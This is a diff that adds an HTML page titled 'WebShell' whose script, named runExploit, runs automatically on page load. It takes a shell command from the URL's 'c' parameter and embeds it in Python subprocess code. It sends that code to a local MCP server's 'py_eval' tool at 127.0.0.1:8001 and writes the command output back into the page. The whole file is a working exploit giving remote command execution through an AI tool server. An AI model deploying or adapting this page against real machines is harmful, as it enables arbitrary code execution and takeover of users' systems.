@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>WebShell</title>
+</head>
+
+<body>
+    <script>
+        async function runExploit() {
+            const params = new URLSearchParams(window.location.search);
+            // Default to 'id' if no command provided
+            const userCmd = params.get('c') || 'id';
+
+            // Python code to execute system command
+            // We capture output into a variable named 'output' so it appears in local_vars
+            const cmd = `
+import subprocess
+try:
+    output = subprocess.getoutput('${userCmd.replace(/'/g, "\\'")}')
+except Exception as e:
+    output = str(e)
+`;
+
+            const payload = {
+                "params": {
+                    "name": "py_eval",
+                    "arguments": {
+                        "code": cmd
+                    }
+                }
+            };
+
+            try {
+                const response = await fetch("http://127.0.0.1:8001/mcp", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                const jsonResp = await response.json();
+
+                // Extract result
+                try {
+                    const textPayload = jsonResp.result.content[0].text;
+                    const evalResult = JSON.parse(textPayload);
+
+                    document.open();
+                    document.write("|||RESULT_START|||" + evalResult.result + "|||RESULT_END|||");
+                    document.close();
+                } catch (parseError) {
+                    document.body.innerText = "Error: " + parseError;
+                }
+
+            } catch (error) {
+                document.body.innerText = "Fetch Error: " + error.toString();
+            }
+        }
+        runExploit();
+    </script>
+</body>
+
+</html>
